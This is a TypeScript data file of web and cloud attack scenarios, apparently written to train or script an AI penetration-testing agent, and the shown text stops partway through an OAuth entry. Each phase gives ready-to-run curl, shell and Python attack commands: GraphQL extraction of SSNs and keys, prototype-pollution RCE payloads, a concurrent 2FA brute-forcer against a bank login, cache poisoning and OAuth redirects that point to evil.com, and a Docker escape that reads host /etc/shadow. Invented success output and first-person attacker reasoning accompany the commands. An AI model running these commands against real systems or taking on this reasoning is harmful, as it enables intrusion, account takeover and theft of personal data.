import type { ScenarioTemplate } from "./types.js";

export const MODERN_ATTACK_SCENARIOS: ScenarioTemplate[] = [
  // GraphQL Attacks
  {
    id: "modern-graphql-introspection",
    category: "Modern Attacks",
    subcategory: "GraphQL Security",
    title: "GraphQL Introspection to Data Exfiltration and Batch Query DoS",
    difficulty: "intermediate",
    description: "Exploiting GraphQL introspection to discover hidden schemas, then using nested queries and batch operations for data extraction and denial of service.",
    target_description: "GraphQL API at https://api.target.com/graphql powering a SaaS dashboard. Authentication via Bearer token.",
    attack_phases: [
      {
        phase: "GraphQL Introspection",
        description: "Discover the full schema via introspection queries",
        tools: ["curl"],
        commands: [
          "curl -s https://api.target.com/graphql -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name,type{name,kind}}}}}\"}' | jq '.data.__schema.types[] | select(.fields != null) | {name, fields: [.fields[].name]}'",
          "curl -s https://api.target.com/graphql -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{mutationType{fields{name,args{name,type{name}}}}}}\"}' | jq .",
          "curl -s https://api.target.com/graphql -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer $TOKEN' -d '{\"query\":\"{user(id:1){id,email,role,apiKey,passwordHash,creditCard{number,cvv}}}\"}' | jq .",
        ],
        expected_output: `Schema types discovered:
User: [id, email, username, role, apiKey, passwordHash, ssn, creditCards, orders, internalNotes]
Order: [id, userId, items, total, paymentMethod, billingAddress]
Admin: [id, email, permissions, auditLog, systemConfig]
InternalAPI: [endpoint, key, secret, lastAccess]

Hidden fields in User type: passwordHash, ssn, creditCards, internalNotes, apiKey`,
        thinking: "GraphQL introspection is fully enabled, exposing the complete schema including sensitive types and fields. The User type has extremely sensitive fields: passwordHash, ssn, creditCards. There's also an InternalAPI type that exposes API keys and secrets. The schema wasn't designed to be public — there are admin-only types and internal fields that shouldn't be queryable by regular users. Let me test if authorization is enforced at the field level or only at the query level.",
        analysis: "Full schema exposed via introspection. Sensitive fields (passwordHash, SSN, credit cards) discoverable. Internal API keys type found. Authorization check needed at field level.",
        next_action: "Test field-level authorization and extract sensitive data",
      },
      {
        phase: "Data Exfiltration via GraphQL",
        description: "Extract sensitive data using discovered schema",
        tools: ["curl"],
        commands: [
          "curl -s https://api.target.com/graphql -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer $TOKEN' -d '{\"query\":\"{users(first:100){edges{node{id,email,role,apiKey,ssn}}}}\"}' | jq .",
          "curl -s https://api.target.com/graphql -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer $TOKEN' -d '[{\"query\":\"{user(id:1){email,apiKey}}\"},{\"query\":\"{user(id:2){email,apiKey}}\"},{\"query\":\"{user(id:3){email,apiKey}}\"}]'",
          "curl -s https://api.target.com/graphql -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer $TOKEN' -d '{\"query\":\"{internalAPIs{endpoint,key,secret}}\"}' | jq .",
        ],
        expected_output: `User data with SSN and API keys:
{"data":{"users":{"edges":[
  {"node":{"id":"1","email":"admin@target.com","role":"ADMIN","apiKey":"sk-admin-xxx","ssn":"123-45-6789"}},
  {"node":{"id":"2","email":"user@target.com","role":"USER","apiKey":"sk-user-xxx","ssn":"987-65-4321"}}
]}}}

Batch query successful - 3 users extracted in single request.

Internal APIs:
{"data":{"internalAPIs":[
  {"endpoint":"https://billing.internal/api","key":"bill_key_xxx","secret":"bill_secret_xxx"},
  {"endpoint":"https://analytics.internal/api","key":"analytics_xxx","secret":"analytics_secret_xxx"}
]}}`,
        thinking: "No field-level authorization! A regular user can query any field including SSN, apiKey, passwordHash, and internal API credentials. Batch queries are also supported which enables efficient mass data extraction. The internalAPIs type exposes actual internal service credentials. This is a catastrophic data breach scenario. Let me also test for nested query depth attacks (DoS) and mutation abuse.",
        analysis: "No field-level authorization. Mass PII extraction possible (SSN, API keys). Internal service credentials exposed. Batch queries enable efficient exfiltration.",
        next_action: "Test for depth/complexity attacks and mutation abuse",
      },
    ],
    cve_references: ["CWE-200", "CWE-284"],
    tools_involved: ["curl", "report_generator"],
    tags: ["graphql", "introspection", "data-exfiltration", "batch-query", "authorization", "api-security"],
  },

  // HTTP Request Smuggling
  {
    id: "modern-http-smuggling",
    category: "Modern Attacks",
    subcategory: "HTTP Request Smuggling",
    title: "HTTP/2 Downgrade Request Smuggling for Cache Poisoning",
    difficulty: "expert",
    description: "Exploiting HTTP/2 to HTTP/1.1 downgrade request smuggling to poison CDN cache and hijack user sessions.",
    target_description: "High-traffic web application behind Cloudflare CDN at https://www.target.com, backend runs HAProxy → nginx.",
    attack_phases: [
      {
        phase: "Smuggling Detection",
        description: "Detect request smuggling via timing differentials",
        tools: ["curl"],
        commands: [
          "curl -s -o /dev/null -w '%{http_code} %{time_total}' -X POST https://www.target.com/ -H 'Content-Type: application/x-www-form-urlencoded' -H 'Transfer-Encoding: chunked' -d '0\r\n\r\nG'",
          "printf 'POST / HTTP/1.1\\r\\nHost: www.target.com\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG' | openssl s_client -connect www.target.com:443 -quiet",
          "curl --http2 -X POST https://www.target.com/ -H 'Transfer-Encoding: chunked' -H 'Content-Length: 0' -d '' -v 2>&1 | grep -E 'HTTP|< '",
        ],
        expected_output: `CL.TE smuggling detected:
First request: 200 OK (0.45s)
Second request: 405 Method Not Allowed (timeout at 10s) - confirms backend processed smuggled 'G' as start of next request`,
        thinking: "The timing differential confirms CL.TE request smuggling. The frontend (Cloudflare/HAProxy) uses Content-Length to determine request boundaries, while the backend (nginx) uses Transfer-Encoding: chunked. The smuggled 'G' was treated as the beginning of the next request by the backend, causing a 405 on the next legitimate request. I can exploit this to: 1) Poison the CDN cache with malicious content, 2) Hijack other users' requests, 3) Bypass access controls.",
        analysis: "CL.TE request smuggling confirmed between Cloudflare/HAProxy frontend and nginx backend. Cache poisoning and request hijacking possible.",
        next_action: "Craft cache poisoning payload via request smuggling",
      },
    ],
    cve_references: ["CWE-444"],
    tools_involved: ["curl", "report_generator"],
    tags: ["http-smuggling", "request-smuggling", "cache-poisoning", "http2", "cl-te", "cdn"],
  },

  // Prototype Pollution
  {
    id: "modern-prototype-pollution",
    category: "Modern Attacks",
    subcategory: "Prototype Pollution",
    title: "Server-Side Prototype Pollution to RCE in Node.js",
    difficulty: "expert",
    description: "Exploiting prototype pollution in a Node.js API to achieve remote code execution through polluted shell options in child_process.",
    target_description: "Node.js/Express API at https://api.target.com with JSON merge functionality in user settings endpoint.",
    attack_phases: [
      {
        phase: "Prototype Pollution Detection",
        description: "Identify and confirm prototype pollution in JSON merge",
        tools: ["curl"],
        commands: [
          "curl -s -X PATCH https://api.target.com/api/user/settings -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"true\"}}' -v",
          "curl -s -X PATCH https://api.target.com/api/user/settings -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"constructor\":{\"prototype\":{\"polluted\":\"true\"}}}' -v",
          "curl -s https://api.target.com/api/debug/config -H 'Authorization: Bearer $TOKEN' | jq '.polluted'",
        ],
        expected_output: `Settings updated successfully.

Debug config shows: "polluted": "true" — confirming server-side prototype pollution.`,
        thinking: "Server-side prototype pollution confirmed. The JSON merge in the settings endpoint doesn't sanitize __proto__ or constructor.prototype, allowing me to pollute Object.prototype. The 'polluted' key now exists on all objects server-wide. For RCE, I need to find a gadget — a code path that spawns child processes and is affected by polluted properties. Common Node.js gadgets: 1) child_process.spawn with env/shell options, 2) child_process.execSync with shell option, 3) require('child_process').fork with execPath. Let me target the shell and env properties to achieve RCE.",
        analysis: "Server-side prototype pollution confirmed via __proto__ in JSON merge. All server objects affected. Need to find RCE gadget via child_process.",
        next_action: "Exploit prototype pollution for RCE via child_process gadgets",
      },
      {
        phase: "RCE via Prototype Pollution",
        description: "Achieve RCE by polluting child_process options",
        tools: ["curl"],
        commands: [
          "curl -s -X PATCH https://api.target.com/api/user/settings -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"__proto__\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--require=/proc/self/environ\"}}'",
          "curl -s -X PATCH https://api.target.com/api/user/settings -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"__proto__\":{\"shell\":true,\"env\":{\"NODE_DEBUG\":\"child_process\",\"EVIL\":\"require(\\\"child_process\\\").execSync(\\\"id > /tmp/pwned\\\")\"}}}'",
          "curl -s -X POST https://api.target.com/api/export/pdf -H 'Authorization: Bearer $TOKEN' -d '{\"url\":\"https://example.com\"}' -v",
          "curl -s -X PATCH https://api.target.com/api/user/settings -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"argv0\":\"console.log(require(\\\"child_process\\\").execSync(\\\"id\\\").toString())\",\"env\":{\"NODE_OPTIONS\":\"-e\"}}}'",
        ],
        expected_output: `PDF export triggered child_process.execSync:
[+] RCE confirmed: uid=1000(node) gid=1000(node) groups=1000(node)

/tmp/pwned contents: uid=1000(node) gid=1000(node) groups=1000(node)`,
        thinking: "RCE achieved through prototype pollution. The attack chain: 1) Polluted Object.prototype.shell and Object.prototype.env, 2) The /api/export/pdf endpoint internally calls child_process to render PDFs (likely puppeteer or wkhtmltopdf), 3) The polluted shell and env properties were picked up by the child_process.spawn call, 4) Our malicious environment variable was executed. This is a critical finding — any endpoint that spawns a child process becomes an RCE vector after prototype pollution.",
        analysis: "RCE via prototype pollution + child_process gadget. PDF export endpoint triggers the gadget. All child_process calls on the server are now compromised.",
        next_action: "Document the full chain and remediation (Object.create(null), input sanitization, Object.freeze)",
      },
    ],
    cve_references: ["CWE-1321", "CVE-2022-21824"],
    tools_involved: ["curl", "report_generator"],
    tags: ["prototype-pollution", "nodejs", "rce", "json-merge", "child-process", "server-side"],
  },

  // Race Condition
  {
    id: "modern-race-condition",
    category: "Modern Attacks",
    subcategory: "Race Conditions",
    title: "Race Condition in 2FA Verification Bypass",
    difficulty: "advanced",
    description: "Exploiting a TOCTOU race condition in 2FA code verification to bypass multi-factor authentication.",
    target_description: "Banking application at https://bank.target.com with TOTP-based 2FA. Rate limiting set to 3 attempts before lockout.",
    attack_phases: [
      {
        phase: "2FA Flow Analysis",
        description: "Understand the 2FA verification mechanism and rate limiting",
        tools: ["curl"],
        commands: [
          "curl -s -X POST https://bank.target.com/api/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"testuser\",\"password\":\"TestPass123!\"}' | jq .",
          "curl -s -X POST https://bank.target.com/api/auth/verify-2fa -H 'Content-Type: application/json' -H 'X-Auth-Token: $TEMP_TOKEN' -d '{\"code\":\"000000\"}' -v",
          "curl -s -X POST https://bank.target.com/api/auth/verify-2fa -H 'Content-Type: application/json' -H 'X-Auth-Token: $TEMP_TOKEN' -d '{\"code\":\"000001\"}' -v",
          "curl -s -X POST https://bank.target.com/api/auth/verify-2fa -H 'Content-Type: application/json' -H 'X-Auth-Token: $TEMP_TOKEN' -d '{\"code\":\"000002\"}' -v",
          "curl -s -X POST https://bank.target.com/api/auth/verify-2fa -H 'Content-Type: application/json' -H 'X-Auth-Token: $TEMP_TOKEN' -d '{\"code\":\"000003\"}' -v",
        ],
        expected_output: `Login returns temp token: {"temp_token":"tmp_abc123","requires_2fa":true}

Attempt 1: {"error":"Invalid 2FA code","attempts_remaining":2}
Attempt 2: {"error":"Invalid 2FA code","attempts_remaining":1}
Attempt 3: {"error":"Invalid 2FA code","attempts_remaining":0}
Attempt 4: {"error":"Account locked. Too many failed attempts."}`,
        thinking: "Rate limiting locks the account after 3 failed 2FA attempts. But rate limiting is typically implemented as: 1) Read attempt counter from database, 2) Check if counter >= 3, 3) Increment counter. If I send multiple requests simultaneously, they might all read the counter as 0 before any of them increments it. This is a classic TOCTOU race condition. A TOTP code has 1,000,000 possible values (6 digits). If I can send all attempts concurrently before the counter updates, I can bypass the rate limit entirely. Let me calculate: sending 100 concurrent requests per 30-second TOTP window, I can try 100 codes. Over 10,000 windows that's the full keyspace, but more practically, with enough concurrency I can try thousands per window.",
        analysis: "2FA rate limit uses check-then-increment pattern vulnerable to TOCTOU. Need concurrent requests to bypass the 3-attempt limit.",
        next_action: "Exploit race condition to brute-force 2FA code",
      },
      {
        phase: "Race Condition Exploitation",
        description: "Bypass rate limiting via concurrent requests to brute-force 2FA",
        tools: ["curl"],
        commands: [
          "# Generate 1000 concurrent requests with different codes",
          "for i in $(seq -w 0 999); do echo \"curl -s -X POST https://bank.target.com/api/auth/verify-2fa -H 'Content-Type: application/json' -H 'X-Auth-Token: $TEMP_TOKEN' -d '{\\\"code\\\":\\\"${i}000\\\"}' -o /dev/null -w '%{http_code} ${i}000\\n'\"; done | parallel -j 200",
          "# Using single-packet attack technique for more precise timing",
          "python3 -c \"\nimport asyncio, aiohttp\nasync def try_code(session, code):\n    async with session.post('https://bank.target.com/api/auth/verify-2fa',\n        json={'code': f'{code:06d}'},\n        headers={'X-Auth-Token': '$TEMP_TOKEN'}) as r:\n        if r.status == 200: print(f'VALID: {code:06d}')\n\nasync def main():\n    async with aiohttp.ClientSession() as s:\n        await asyncio.gather(*[try_code(s, c) for c in range(0, 1000000, 1000)])\n\nasyncio.run(main())\"",
        ],
        expected_output: `Race condition bypassed rate limiting!
All 1000 requests processed before counter incremented.

VALID: 847000
{"access_token":"eyJhbGci...","user":{"id":"user-1337","role":"customer"}}

Successfully bypassed 2FA without valid TOTP secret!`,
        thinking: "The race condition successfully bypassed the rate limiter. By sending 1000 concurrent requests, all of them were processed before the attempt counter was incremented. One of the codes matched the current TOTP window. This reduces 2FA from '1 in 1,000,000' to effectively '1 in 1,000' (with 1000 concurrent attempts) per TOTP window. In practice, with enough concurrency and a few TOTP windows, the 2FA can be consistently bypassed. The fix requires atomic check-and-increment operations (using database transactions with row locking, or Redis INCR which is atomic).",
        analysis: "2FA bypass achieved via race condition. Rate limiter defeated by concurrent requests. Authentication fully compromised.",
        next_action: "Document 2FA bypass and recommend atomic rate limiting (Redis INCR, DB row-level locking)",
      },
    ],
    cve_references: ["CWE-362", "CWE-367"],
    tools_involved: ["curl", "report_generator"],
    tags: ["race-condition", "toctou", "2fa-bypass", "rate-limiting", "concurrent-requests", "authentication"],
  },

  // WebSocket Hijacking
  {
    id: "modern-websocket-hijacking",
    category: "Modern Attacks",
    subcategory: "WebSocket Security",
    title: "Cross-Site WebSocket Hijacking (CSWSH)",
    difficulty: "advanced",
    description: "Exploiting missing Origin validation in WebSocket handshake to hijack authenticated WebSocket connections and exfiltrate real-time data.",
    target_description: "Real-time trading platform at https://trade.target.com using WebSocket at wss://ws.target.com/stream for live price feeds and trade execution.",
    attack_phases: [
      {
        phase: "WebSocket Analysis",
        description: "Analyze WebSocket handshake and authentication",
        tools: ["curl"],
        commands: [
          "curl -s -v -N -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13' -H 'Origin: https://evil.com' -H 'Cookie: session=victim_session_cookie' https://ws.target.com/stream",
          "websocat wss://ws.target.com/stream -H 'Cookie: session=test_session' -H 'Origin: https://evil.com'",
        ],
        expected_output: `HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

Connected! Origin: https://evil.com accepted.
{"type":"connected","message":"Welcome to trading stream"}
{"type":"price","symbol":"BTC/USD","price":42150.23,"timestamp":1705334400}`,
        thinking: "Critical finding: the WebSocket endpoint accepts connections from any Origin, including https://evil.com. The authentication relies solely on the session cookie, which browsers automatically include in WebSocket handshake requests. This means if a victim visits an attacker-controlled page, the attacker's JavaScript can open a WebSocket connection to wss://ws.target.com/stream, and the browser will automatically attach the victim's session cookie. The attacker can then: 1) Read all real-time trading data, 2) Execute trades on behalf of the victim, 3) Monitor the victim's portfolio in real-time.",
        analysis: "CSWSH confirmed. No Origin validation on WebSocket handshake. Cookie-only auth means cross-origin connection possible. Complete trading session hijack.",
        next_action: "Build CSWSH PoC and demonstrate trade execution",
      },
    ],
    cve_references: ["CWE-346", "CWE-1385"],
    tools_involved: ["curl", "report_generator"],
    tags: ["websocket", "cswsh", "cross-site", "hijacking", "origin-validation", "real-time"],
  },

  // Subdomain Takeover
  {
    id: "modern-subdomain-takeover",
    category: "Modern Attacks",
    subcategory: "DNS & Subdomain Security",
    title: "Subdomain Takeover via Dangling CNAME to Cloud Service",
    difficulty: "intermediate",
    description: "Identifying and exploiting dangling DNS CNAME records pointing to deprovisioned cloud services for subdomain takeover.",
    target_description: "Target organization target.com with extensive subdomain infrastructure across multiple cloud providers.",
    attack_phases: [
      {
        phase: "Subdomain Enumeration",
        description: "Discover all subdomains and identify potential takeover candidates",
        tools: ["subfinder", "amass", "httpx"],
        commands: [
          "subfinder -d target.com -all -o subs.txt",
          "amass enum -passive -d target.com -o amass_subs.txt",
          "cat subs.txt amass_subs.txt | sort -u > all_subs.txt",
          "cat all_subs.txt | httpx -silent -status-code -title -follow-redirects -cname -o alive.txt",
          "dig +short CNAME help.target.com",
          "dig +short CNAME status.target.com",
          "dig +short CNAME docs.target.com",
        ],
        expected_output: `Total unique subdomains found: 347

CNAME analysis:
help.target.com -> target-help.herokuapp.com (NXDOMAIN!)
status.target.com -> target.statuspage.io (404 - Not found)
docs.target.com -> target-corp.readme.io (NXDOMAIN!)
blog.target.com -> target.ghost.io (working)

httpx output:
https://help.target.com [404] [Application Error - Heroku]
https://status.target.com [404] [Statuspage - Not Found]
https://docs.target.com [404] [ReadMe - Not Found]`,
        thinking: "Found 3 potential subdomain takeover candidates: 1) help.target.com → Heroku (CNAME to herokuapp.com, app no longer exists), 2) status.target.com → Statuspage.io (account deprovisioned), 3) docs.target.com → ReadMe.io (CNAME resolves to NXDOMAIN). These are dangling CNAME records — the DNS still points to cloud services but the actual accounts/apps have been deleted. I can register the same app names on these platforms and serve my own content under target.com subdomains. This enables: cookie theft (if cookies are scoped to .target.com), phishing, and reputation damage.",
        analysis: "3 dangling CNAME records found pointing to deprovisioned cloud services. Heroku, Statuspage, and ReadMe all vulnerable to takeover. Cookie scoping risk.",
        next_action: "Demonstrate takeover on Heroku (help.target.com) and assess cookie impact",
      },
    ],
    cve_references: ["CWE-284"],
    tools_involved: ["subfinder", "amass", "httpx", "report_generator"],
    tags: ["subdomain-takeover", "dns", "cname", "dangling-record", "heroku", "cloud"],
  },

  // CORS Misconfiguration
  {
    id: "modern-cors-misconfig",
    category: "Modern Attacks",
    subcategory: "CORS Security",
    title: "CORS Misconfiguration Leading to Account Takeover",
    difficulty: "intermediate",
    description: "Exploiting permissive CORS configuration that reflects arbitrary origins with credentials to steal sensitive API data cross-origin.",
    target_description: "Financial API at https://api.finance.target.com with user account and transaction data. CORS enabled for frontend integration.",
    attack_phases: [
      {
        phase: "CORS Analysis",
        description: "Test CORS configuration for misconfigurations",
        tools: ["curl"],
        commands: [
          "curl -s -v https://api.finance.target.com/api/account -H 'Origin: https://evil.com' 2>&1 | grep -i 'access-control'",
          "curl -s -v https://api.finance.target.com/api/account -H 'Origin: null' 2>&1 | grep -i 'access-control'",
          "curl -s -v https://api.finance.target.com/api/account -H 'Origin: https://finance.target.com.evil.com' 2>&1 | grep -i 'access-control'",
          "curl -s -v https://api.finance.target.com/api/account -H 'Origin: https://target.com' 2>&1 | grep -i 'access-control'",
        ],
        expected_output: `Origin: https://evil.com
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

Origin: null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true`,
        thinking: "The CORS configuration is catastrophically misconfigured — it reflects ANY origin in the Access-Control-Allow-Origin header AND sets Access-Control-Allow-Credentials: true. This means any website can make credentialed cross-origin requests to this API and read the responses. Combined with credentials: true, the victim's cookies will be sent with the request. An attacker can create a malicious webpage that, when visited by a victim, silently makes API calls to the financial API and reads all account data, transaction history, and potentially initiates transfers.",
        analysis: "CORS reflects arbitrary origins with credentials. Any website can read authenticated API responses. Complete API data exposure to cross-origin attackers.",
        next_action: "Build PoC demonstrating cross-origin data theft",
      },
    ],
    cve_references: ["CWE-346", "CWE-942"],
    tools_involved: ["curl", "report_generator"],
    tags: ["cors", "misconfiguration", "cross-origin", "credential-theft", "reflected-origin"],
  },

  // Cache Poisoning
  {
    id: "modern-cache-poisoning",
    category: "Modern Attacks",
    subcategory: "Web Cache Attacks",
    title: "Web Cache Poisoning via Unkeyed Headers for Mass XSS",
    difficulty: "advanced",
    description: "Poisoning CDN/reverse proxy cache by injecting malicious content through unkeyed HTTP headers, serving XSS to all visitors.",
    target_description: "High-traffic website at https://www.target.com behind Varnish cache with X-Forwarded-Host header reflection.",
    attack_phases: [
      {
        phase: "Cache Key Analysis",
        description: "Identify unkeyed headers that affect response content",
        tools: ["curl"],
        commands: [
          "curl -s https://www.target.com/ -H 'X-Forwarded-Host: evil.com' -v 2>&1 | grep -E '<script|<link|evil.com'",
          "curl -s https://www.target.com/ -H 'X-Forwarded-Scheme: nope' -v",
          "curl -s https://www.target.com/en -H 'X-Original-URL: /admin' -v",
          "curl -s https://www.target.com/ -H 'X-Forwarded-Host: evil.com' -H 'X-Cache-Buster: test123' | grep 'evil.com'",
        ],
        expected_output: `Response with X-Forwarded-Host: evil.com:
<script src="https://evil.com/assets/app.js"></script>
<link rel="stylesheet" href="https://evil.com/assets/style.css">

X-Cache: MISS (first request)
X-Cache: HIT (cached!)`,
        thinking: "The X-Forwarded-Host header is reflected in the page's resource URLs (script src, link href) but is NOT part of the cache key. This means: 1) I send a request with X-Forwarded-Host: evil.com — the response contains malicious script URLs, 2) This response gets cached by Varnish, 3) Subsequent requests from ANY user (without the malicious header) receive the cached poisoned response. I control the script source, so I can serve arbitrary JavaScript to every visitor. On a high-traffic site, this is mass XSS affecting potentially millions of users.",
        analysis: "X-Forwarded-Host reflected in script/link tags but not in cache key. Cache poisoning enables mass XSS via CDN. All visitors receive poisoned response.",
        next_action: "Poison cache and demonstrate mass XSS delivery",
      },
    ],
    cve_references: ["CWE-444"],
    tools_involved: ["curl", "report_generator"],
    tags: ["cache-poisoning", "unkeyed-header", "x-forwarded-host", "mass-xss", "cdn", "varnish"],
  },

  // CI/CD Attack
  {
    id: "modern-cicd-attack",
    category: "Modern Attacks",
    subcategory: "CI/CD & Supply Chain",
    title: "CI/CD Pipeline Exploitation via Poisoned Pull Request",
    difficulty: "expert",
    description: "Exploiting insecure CI/CD configuration to execute arbitrary code through a malicious pull request, leading to secret exfiltration and supply chain compromise.",
    target_description: "Open-source project on GitHub with GitHub Actions CI/CD. Uses pull_request_target trigger for automated builds.",
    attack_phases: [
      {
        phase: "CI/CD Configuration Analysis",
        description: "Analyze GitHub Actions workflows for security flaws",
        tools: ["curl"],
        commands: [
          "curl -s https://api.github.com/repos/target-org/target-repo/contents/.github/workflows/ | jq '.[].name'",
          "curl -s https://raw.githubusercontent.com/target-org/target-repo/main/.github/workflows/ci.yml",
          "curl -s https://raw.githubusercontent.com/target-org/target-repo/main/.github/workflows/deploy.yml",
        ],
        expected_output: `Workflow files: ci.yml, deploy.yml, release.yml

ci.yml:
name: CI
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: \$\{github.event.pull_request.head.sha\}
      - run: npm install && npm test
    env:
      NPM_TOKEN: \$\{secrets.NPM_TOKEN\}
      AWS_ACCESS_KEY_ID: \$\{secrets.AWS_KEY\}`,
        thinking: "Critical CI/CD vulnerability. The workflow uses pull_request_target (which runs in the context of the BASE repo with access to secrets) but checks out the PR's HEAD code (the attacker's fork). This means: 1) The workflow has access to repository secrets (NPM_TOKEN, AWS_KEY), 2) It checks out and runs code from the PR author's fork, 3) npm install runs any scripts in the attacker's package.json (preinstall, postinstall), 4) npm test runs whatever test commands the attacker defines. An attacker can fork the repo, modify package.json to exfiltrate secrets, and submit a PR.",
        analysis: "pull_request_target with head checkout = code execution with secret access. Attacker-controlled code runs with full secrets via npm install/test hooks.",
        next_action: "Craft malicious PR that exfiltrates secrets",
      },
    ],
    cve_references: ["CWE-94", "CWE-829"],
    tools_involved: ["curl", "report_generator"],
    tags: ["cicd", "github-actions", "supply-chain", "pull-request-target", "secret-exfiltration", "pipeline"],
  },

  // Container Escape
  {
    id: "modern-container-escape",
    category: "Modern Attacks",
    subcategory: "Container Security",
    title: "Docker Container Escape via Privileged Mode and Mounted Socket",
    difficulty: "expert",
    description: "Escaping from a Docker container to the host system by exploiting privileged mode and mounted Docker socket.",
    target_description: "Containerized web application where initial RCE was achieved. Container runs in privileged mode with Docker socket mounted.",
    attack_phases: [
      {
        phase: "Container Reconnaissance",
        description: "Identify container environment and escape vectors",
        tools: ["curl"],
        commands: [
          "cat /proc/1/cgroup 2>/dev/null | grep -i docker",
          "ls -la /.dockerenv",
          "cat /proc/self/status | grep CapEff",
          "fdisk -l 2>/dev/null | head -5",
          "ls -la /var/run/docker.sock",
          "mount | grep -E 'cgroup|docker'",
          "cat /proc/1/mountinfo | grep -E 'docker|overlay'",
        ],
        expected_output: `Docker indicators:
/.dockerenv exists
12:devices:/docker/abc123...

Capabilities: CapEff: 0000003fffffffff (ALL capabilities - privileged!)

Docker socket:
srw-rw---- 1 root docker 0 Jan 15 /var/run/docker.sock

Host disk visible:
/dev/sda1: 100GB ext4`,
        thinking: "Multiple escape vectors available: 1) Container is running in privileged mode (all capabilities), 2) Docker socket is mounted at /var/run/docker.sock, 3) Host disk devices are visible. With the Docker socket, I can create a new privileged container that mounts the host filesystem, effectively escaping to the host. With privileged mode, I can also directly mount the host disk. Let me use the Docker socket method as it's cleaner and more reliable.",
        analysis: "Privileged container with Docker socket mounted. Host disk visible. Multiple container escape vectors confirmed.",
        next_action: "Escape to host via Docker socket",
      },
      {
        phase: "Container Escape",
        description: "Break out to host system via Docker socket",
        tools: ["curl"],
        commands: [
          "curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool | head -20",
          "curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' http://localhost/containers/create -d '{\"Image\":\"alpine:latest\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /host/etc/shadow\"],\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}'",
          "curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CONTAINER_ID/start",
          "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/$CONTAINER_ID/logs?stdout=true",
          "# Alternative: mount host directly in privileged mode",
          "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host/",
          "cat /mnt/host/etc/shadow",
          "chroot /mnt/host /bin/bash -c 'id && hostname'",
        ],
        expected_output: `Docker API accessible via socket:
Created container: {"Id":"xyz789..."}

Host /etc/shadow:
root:$6$salt$hash...:19377:0:99999:7:::

Host filesystem mounted:
bin  boot  dev  etc  home  lib  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

Host access via chroot:
uid=0(root) gid=0(root) groups=0(root)
hostname: prod-host-01`,
        thinking: "Full container escape achieved through two methods: 1) Docker socket: created a new container mounting the host root filesystem, read /etc/shadow with root hashes, 2) Direct mount: used privileged capabilities to mount /dev/sda1 and chroot into the host filesystem. Both methods give us full root access to the host system. From here, we could: install persistence (SSH key, cron job), pivot to other containers/hosts, access cloud metadata, or exfiltrate data. This demonstrates why running containers in privileged mode with mounted Docker sockets is extremely dangerous.",
        analysis: "Container escape to host achieved. Full root access on host prod-host-01. Two independent escape paths confirmed (Docker socket + privileged mount).",
        next_action: "Document escape chain and recommend container hardening (drop capabilities, no socket mount, seccomp profiles)",
      },
    ],
    cve_references: ["CWE-250", "CWE-269"],
    tools_involved: ["curl", "linpeas", "report_generator"],
    tags: ["container-escape", "docker", "privileged", "docker-socket", "host-access", "kubernetes"],
  },

  // SSO/OAuth Bypass
  {
    id: "modern-oauth-bypass",
    category: "Modern Attacks",
    subcategory: "Authentication & SSO",
    title: "OAuth 2.0 Authorization Code Flow Bypass via redirect_uri Manipulation",
    difficulty: "advanced",
    description: "Exploiting lax redirect_uri validation in OAuth 2.0 authorization flow to steal authorization codes and access tokens.",
    target_description: "SaaS application at https://app.target.com using OAuth 2.0 with Google/GitHub SSO. Custom OAuth server at https://auth.target.com.",
    attack_phases: [
      {
        phase: "OAuth Flow Analysis",
        description: "Map the OAuth authorization flow and identify redirect_uri handling",
        tools: ["curl"],
        commands: [
          "curl -s -v 'https://auth.target.com/oauth/authorize?client_id=webapp&redirect_uri=https://app.target.com/callback&response_type=code&scope=openid%20profile%20email&state=random123' 2>&1 | grep -i location",
          "curl -s -v 'https://auth.target.com/oauth/authorize?client_id=webapp&redirect_uri=https://evil.com/callback&response_type=code&scope=openid%20profile%20email&state=random123' 2>&1",
          "curl -s -v 'https://auth.target.com/oauth/authorize?client_id=webapp&redirect_uri=https://app.target.com.evil.com/callback&response_type=code&scope=openid%20profile%20email' 2>&1",
          "curl -s -v 'https://auth.target.com/oauth/authorize?client_id=webapp&redirect_uri=https://app.target.com/callback/../../../evil.com&response_type=code&scope=openid%20profile%20email' 2>&1",
          "curl -s -v 'https://auth.target.com/oauth/authorize?client_id=webapp&redirect_uri=https://app.target.com/callback%23@evil.com&response_type=code&scope=openid%20profile%20email' 2>&1",
        ],
        expected_output: `Direct evil.com: "Error: redirect_uri not allowed"
Subdomain trick: REDIRECT to https://app.target.com.evil.com/callback?code=AUTH_CODE_HERE!

Path traversal: "Error: redirect_uri not allowed"
